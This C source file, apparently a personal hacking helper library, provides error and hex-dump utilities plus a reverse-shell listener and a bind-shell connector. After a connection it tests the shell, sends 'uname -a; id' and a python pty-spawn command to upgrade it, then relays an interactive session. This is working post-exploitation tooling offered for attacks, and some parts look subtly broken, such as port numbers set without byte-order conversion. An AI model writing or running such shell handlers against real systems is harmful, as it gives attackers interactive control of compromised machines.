/*
 * Written by F0rb1dd3n
 *
 * Functions to help hacking, enjoy!
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char good[] = "\e[01;34m[\e[00m+\e[01;34m]\e[00m";
char bad[] = "\e[01;31m[\e[00m-\e[01;31m]\e[00m";
char warn[] = "\e[01;33m[\e[00m!\e[01;33m]\e[00m";

// A function to display an error message and then exit
void fatal(char *message) {
   char error_message[129];

   strcpy(error_message, bad);
   strncat(error_message, " Error ", 7); 
   strncat(error_message, message, 93);
   perror(error_message);
   printf("\n\n");
   exit(-1);
}

// dumps raw memory in hex byte and printable split format
void dump(const unsigned char *data_buffer, const unsigned int length) {
   unsigned char byte;
   unsigned int i, j;
   for(i=0; i < length; i++) {
      byte = data_buffer[i];
      printf("%02x ", data_buffer[i]);
      if(((i%16)==15) || (i==length-1)) {
	 for(j=0; j < 15-(i%16); j++)
	    printf("   ");
	 printf("| ");
	 for(j=(i-(i%16)); j <= i; j++) {
	    byte = data_buffer[j];
	    if((byte > 31) && (byte < 127))
	       printf("%c", byte);
	    else
	       printf(".");
	 }
	 printf("\n");
      }
   }
   printf("\n");
}

int index_of(const unsigned char *data_buffer, const unsigned int length, 
   const unsigned char *needle, const unsigned int needlelen){
   int k;
   for(k=0; k < length; k++){
      if(memcmp(data_buffer+k, needle, needlelen) == 0){
         return k;
      }
   }
   return -1;
}

int checkshell(int fd) {
  char got[32];

  if (write (fd, "echo hacked\n", 12) < 0)
    return -1;

  if (read (fd, got, 32) <= 0)
    return -1;

  return -!strstr (got, "hacked");
}

void shell(int fd) {
    fd_set fds;
    char tmp[0xffff];
    int n;
    
    for (;;) {
	FD_ZERO(&fds);
	FD_SET(fd, &fds);
	FD_SET(0, &fds);

	if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) < 0) {
	    fatal("select");
	    break;
	} 

        /* read from fd and write to stdout */
	if (FD_ISSET(fd, &fds)) {
	   if ((n = read(fd, tmp, sizeof(tmp))) < 0) {
	       fatal("on receive data");
	       break;
	   }
	   if (write(1, tmp, n) < 0) {
	       fatal("write");
	       break;
	   }
	}

	/* read from stdin and write to fd */
	if (FD_ISSET(0, &fds)) {
	    if ((n = read(0, tmp, sizeof(tmp))) < 0) {
	        fatal("read");
	        break;
	    }
	    if (write(fd, tmp, n) < 0) {
	        fatal("on send data");
	        break;
	    }
	    if(strncmp(tmp, "exit\n", 5) == 0) {
	        write(STDOUT_FILENO, "Goodbye!\n", 9);
		break;
	    }
	}
    }
}

void listener(int port) {
	int sockfd, new_sockfd;
	struct sockaddr_in host_addr, client_addr;
	socklen_t sin_size;
	int r_length=1, yes=1;
	char buff[256];

	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		fatal("in socket");

	host_addr.sin_family = AF_INET;
	host_addr.sin_port = port;
	host_addr.sin_addr.s_addr = INADDR_ANY;
	memset(&(host_addr.sin_zero), '\0', 8);

	if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
		fatal("binding to socket");

	if (listen(sockfd, 5) == -1) {
		fatal("listening on socket");
	} else {
		printf("%s Listening on port %d...\n", good, port);
	}

	sin_size = sizeof(struct sockaddr_in);
	new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
	if(new_sockfd == -1)
		fatal("accepting connection");

	printf("%s Connection from %s port %d...", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
		
	if(checkshell(new_sockfd) == -1) {
		fatal("reverse shell not openned");
	} else {
		printf(" Shell is openned!\n\n");
	}
	
        send(new_sockfd, "uname -a; id; echo; export TERM=linux; python -c 'import pty;pty.spawn(\"/bin/bash\")';\n", 95, 0);
	shell(new_sockfd);
	send(new_sockfd, "exit\n", 5, 0); // because of python pty it is necessary exit 2 times
	close(new_sockfd);
	close(sockfd);
}

void bind_conn(char *host, int port){
	int sockfd;
   	struct hostent *host_info;
	struct sockaddr_in target_addr;

   	if((host_info = gethostbyname(host)) == NULL)
      		fatal("looking up hostname");

   	target_addr.sin_family = AF_INET;
   	target_addr.sin_port = port;   
   	target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
   	memset(&(target_addr.sin_zero), '\0', 8); // zero the rest of the struct
  
   	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
      		fatal("in socket");

   	printf("\nConnecting on port %d...\n", port);

   	if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1){
      		fatal("on connecting to target server");
   	} else {
      		printf("%s Connected...", good);
   	}

	if(checkshell(sockfd) == -1) {
		fatal(" but shell not openned");
	} else {
		printf(" Shell is openned!\n\n");
	}
	
	send(sockfd, "uname -a; id; echo; export TERM=linux;\n", 39, 0); 
	send(sockfd, "python -c 'import pty;pty.spawn(\"/bin/bash\")';\n", 47, 0);
	shell(sockfd);
	send(sockfd, "exit\n", 5, 0); // because of python pty it is necessary exit 2 times
	close(sockfd);
}
